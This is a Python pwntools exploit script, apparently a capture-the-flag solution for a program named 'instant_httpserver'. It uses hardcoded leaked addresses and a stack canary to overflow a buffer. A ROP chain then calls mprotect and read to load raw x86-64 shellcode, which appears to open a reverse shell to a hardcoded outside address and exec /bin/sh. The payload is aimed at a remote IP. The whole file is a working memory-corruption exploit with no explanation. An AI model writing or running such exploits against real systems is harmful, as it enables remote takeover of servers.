from pwn import *
import time


addr_prog = 0x000055622f433000  # local
canary = 0xc9138d1d36df5a00  # local
addr_libc = 0x00007f134faff000  # local

addr_prog = 0x560abcbfc000  # remote
canary = 0x4bd371f7fd688900  # remote
addr_libc = 0x7f7ac2218000  # remote


elf = ELF('./instant_httpserver')
libc = ELF("./libc.so.6")


shellcode = "\x68\x99\x7e\xa1\x5b\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05";



addr_shellcode = addr_prog + 0x202000

pop_rdi = addr_prog + 0xe93
pop_rsi_r15 = addr_prog + 0xe91
pop_rsi = addr_libc + 0x23e6a
pop_rdx = addr_libc + 0x1b96

payload = b''
payload += b'A' * 0x208
payload += p64(canary)
payload += p64(0xdeadbeeffeedbaad)
# mprotect(addr_shellcode, 0x500, 7)
payload += p64(pop_rdi)
payload += p64(addr_shellcode)
payload += p64(pop_rsi)
payload += p64(0x1000)
payload += p64(pop_rdx)
payload += p64(7)
payload += p64(addr_libc + libc.symbols['mprotect'])
# read(4, addr_shellcode, 0x500)
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi)
payload += p64(addr_shellcode)
payload += p64(pop_rdx)
payload += p64(0x500)
payload += p64(addr_libc + libc.symbols['read'])
# (*(addr_shellcode))()
payload += p64(addr_shellcode)


# io = remote('localhost', 4445)
io = remote('114.177.250.4', 4445)

print("Send payload")
io.send(payload)
io.recvuntil(b'Your Req Length is')

time.sleep(0.1)

print("Send shellcode")
io.send(shellcode)

# io.interactive()
